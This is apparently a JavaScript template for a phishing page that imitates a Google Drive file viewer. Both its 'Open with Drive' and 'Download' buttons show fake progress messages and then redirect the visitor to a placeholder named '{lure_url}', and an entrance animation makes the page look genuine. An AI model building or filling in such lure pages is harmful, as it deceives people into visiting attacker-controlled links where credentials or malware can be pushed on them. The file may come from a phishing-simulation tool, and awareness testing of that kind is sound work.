function openWithDrive() {
    const btn = document.querySelector('.btn-drive-primary');
    btn.innerHTML = '<span>Opening...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1000);
}

function downloadFile() {
    const btn = document.querySelector('.btn-drive-secondary');
    btn.innerHTML = '<span>Preparing download...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1500);
}

document.addEventListener('DOMContentLoaded', () => {
    const container = document.querySelector('.file-viewer');
    container.style.opacity = '0';
    container.style.transform = 'translateY(20px)';
    
    setTimeout(() => {
        container.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
        container.style.opacity = '1';
        container.style.transform = 'translateY(0)';
    }, 100);
});
